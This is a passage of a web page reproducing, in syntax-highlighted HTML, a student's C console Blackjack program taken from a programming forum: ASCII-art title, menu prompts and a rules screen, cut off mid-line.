title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><p>ÂéüÂú∞ÂùÄÔºö<a href="http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html" target="_blank" rel="noopener">http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html</a></p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// Programmer: Vladislav Shulman</span><span class="token comment" spellcheck="true">// Final Project</span><span class="token comment" spellcheck="true">// Blackjack</span><span class="token comment" spellcheck="true">// Feel free to use any and all parts of this program and claim it as your own work</span><span class="token comment" spellcheck="true">//FINAL DRAFT</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;math.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;time.h></span>                </span><span class="token comment" spellcheck="true">//Used for srand((unsigned) time(NULL)) command</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;process.h></span>             </span><span class="token comment" spellcheck="true">//Used for system("cls") command</span><span class="token macro property">#<span class="token directive keyword">define</span> spade 06                 </span><span class="token comment" spellcheck="true">//Used to print spade symbol</span><span class="token macro property">#<span class="token directive keyword">define</span> club 05                  </span><span class="token comment" spellcheck="true">//Used to print club symbol</span><span class="token macro property">#<span class="token directive keyword">define</span> diamond 04               </span><span class="token comment" spellcheck="true">//Used to print diamond symbol</span><span class="token macro property">#<span class="token directive keyword">define</span> heart 03                 </span><span class="token comment" spellcheck="true">//Used to print heart symbol</span><span class="token macro property">#<span class="token directive keyword">define</span> RESULTS "Blackjack.txt"  </span><span class="token comment" spellcheck="true">//File name is Blackjack</span><span class="token comment" spellcheck="true">//Global Variables</span><span class="token keyword">int</span> k<span class="token punctuation">;</span><span class="token keyword">int</span> l<span class="token punctuation">;</span><span class="token keyword">int</span> d<span class="token punctuation">;</span><span class="token keyword">int</span> won<span class="token punctuation">;</span><span class="token keyword">int</span> loss<span class="token punctuation">;</span><span class="token keyword">int</span> cash <span class="token operator">=</span> <span class="token number">500</span><span class="token punctuation">;</span><span class="token keyword">int</span> bet<span class="token punctuation">;</span><span class="token keyword">int</span> random_card<span class="token punctuation">;</span><span class="token keyword">int</span> player_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> dealer_total<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Function Prototypes</span><span class="token keyword">int</span> <span class="token function">clubcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//Displays Club Card Image</span><span class="token keyword">int</span> <span class="token function">diamondcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//Displays Diamond Card Image</span><span class="token keyword">int</span> <span class="token function">heartcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//Displays Heart Card Image</span><span class="token keyword">int</span> <span class="token function">spadecard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//Displays Spade Card Image</span><span class="token keyword">int</span> <span class="token function">randcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//Generates random card</span><span class="token keyword">int</span> <span class="token function">betting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//Asks user amount to bet</span><span class="token keyword">void</span> <span class="token function">asktitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//Asks user to continue</span><span class="token keyword">void</span> <span class="token function">rules</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//Prints "Rules of Vlad's Blackjack" menu</span><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//Plays game</span><span class="token keyword">void</span> <span class="token function">dealer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//Function to play for dealer AI</span><span class="token keyword">void</span> <span class="token function">stay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//Function for when user selects 'Stay'</span><span class="token keyword">void</span> <span class="token function">cash_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//Test for if user has cash remaining in purse</span><span class="token keyword">void</span> <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//Asks if user wants to continue playing</span><span class="token keyword">void</span> <span class="token function">fileresults</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//Prints results into Blackjack.txt file in program directory</span><span class="token comment" spellcheck="true">//Main Function</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> choice1<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n              222                111                            "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n            222 222            11111                              "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n           222   222          11 111                            "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                222              111                               "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n               222               111                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c%c%c%c%c     %c%c            %c%c         %c%c%c%c%c    %c    %c                "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c    %c    %c%c           %c  %c       %c     %c   %c   %c              "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c    %c    %c%c          %c    %c     %c          %c  %c               "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c%c%c%c%c     %c%c          %c %c%c %c     %c          %c %c              "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c    %c    %c%c         %c %c%c%c%c %c    %c          %c%c %c             "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>                           <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c     %c   %c%c         %c      %c    %c          %c   %c               "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>                                             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c     %c   %c%c        %c        %c    %c     %c   %c    %c             "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c%c%c%c%c%c    %c%c%c%c%c%c%c   %c        %c     %c%c%c%c%c    %c     %c            "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                                         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                        21                                   "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     %c%c%c%c%c%c%c%c      %c%c         %c%c%c%c%c    %c    %c                "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n        %c%c        %c  %c       %c     %c   %c   %c              "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n        %c%c       %c    %c     %c          %c  %c               "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                               <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n        %c%c       %c %c%c %c     %c          %c %c              "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n        %c%c      %c %c%c%c%c %c    %c          %c%c %c             "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n        %c%c      %c      %c    %c          %c   %c               "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     %c  %c%c     %c        %c    %c     %c   %c    %c             "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                                                                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c%c%c      %c        %c     %c%c%c%c%c    %c     %c            "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                                                                                            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n         222                     111                         "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n        222                      111                         "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n       222                       111                         "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      222222222222222      111111111111111                       "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      2222222222222222    11111111111111111                         "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">asktitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//end program</span><span class="token keyword">void</span> <span class="token function">asktitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// Function for asking player if they want to continue</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> choice1<span class="token punctuation">;</span>    <span class="token keyword">int</span> choice2<span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                 Are You Ready?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                ----------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                      (Y/N)\n                        "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"\n%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'Y'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'y'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'N'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If invalid choice entered</span>    <span class="token punctuation">{</span>                                                                                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Incorrect Choice. Please Enter Y for Yes or N for No.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'Y'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'y'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If yes, continue. Prints menu.</span>    <span class="token punctuation">{</span>             <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nEnter 1 to Begin the Greatest Game Ever Played."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nEnter 2 to See a Complete Listing of Rules."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nEnter 3 to Exit Game. (Not Recommended)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nChoice: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>choice2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Prompts user for choice</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice2<span class="token operator">&lt;</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice2<span class="token operator">></span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If invalid choice entered</span>            <span class="token punctuation">{</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nIncorrect Choice. Please enter 1, 2 or 3\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>choice2<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">switch</span><span class="token punctuation">(</span>choice2<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// Switch case for different choices</span>            <span class="token punctuation">{</span>                   <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">// Case to begin game</span>                   <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">// Case to see rules</span>                   <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token function">rules</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">// Case to exit game</span>                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYour day could have been perfect."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nHave an almost perfect day!\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">default</span><span class="token punctuation">:</span>                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nInvalid Input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End switch case</span>    <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End if loop</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'N'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If no, exit program</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYour day could have been perfect."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nHave an almost perfect day!\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End function</span><span class="token keyword">void</span> <span class="token function">rules</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Prints "Rules of Vlad's Blackjack" list</span><span class="token punctuation">{</span>     <span class="token keyword">char</span> choice1<span class="token punctuation">;</span>     <span class="token keyword">int</span> choice2<span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n           RULES of VLAD's BLACKJACK"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n          ---------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nI."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     Thou shalt not question the odds of this game."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c This program generates cards at random."</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c If you keep losing, you are very unlucky!\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nII."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     Each card has a value."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c Number cards 1 to 10 hold a value of their number."</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c J, Q, and K cards hold a value of 10."</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c Ace cards hold a value of 11"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     The goal of this game is to reach a card value total of 21.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nIII."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     After the dealing of the first two cards, YOU must decide whether to HIT or STAY."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c Staying will keep you safe, hitting will add a card."</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     Because you are competing against the dealer, you must beat his hand."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     BUT BEWARE!."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c If your total goes over 21, you will LOSE!."</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     But the world is not over, because you can always play again.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c%c%c YOUR RESULTS ARE RECORDED AND FOUND IN SAME FOLDER AS PROGRAM %c%c%c\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWould you like to go the previous screen? (I will not take NO for an answer)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                  (Y/N)\n                    "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token 